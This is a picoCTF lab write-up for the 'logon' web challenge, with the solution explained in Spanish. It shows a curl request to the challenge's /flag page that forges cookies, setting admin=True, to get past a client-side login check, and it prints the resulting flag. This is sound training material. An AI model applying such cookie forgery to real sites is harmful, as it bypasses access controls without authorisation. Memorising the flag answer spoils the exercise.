# logon

## Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

## Hints 1

* Hmm it doesn't seem to check anyone's password, except for Joe's?

## Solución

En la terminal de webshell, ingresamos un curl y un -s para que se presente mejor la flag, enseguida ingresamos el link modificado con un '/flag' al final del url, después agregamos un usuario y una contraseña, al igual que un True en el admin y un grep pico para que nos muestre nuestra respectiva flag.

```
Jaz_sparrow-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/
problem/44573/flag -H "Cookie: username=jazmin; password=jazmin; admin=True" | 
grep pico

        <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
```

Flag:
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>
### Respuesta: picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}

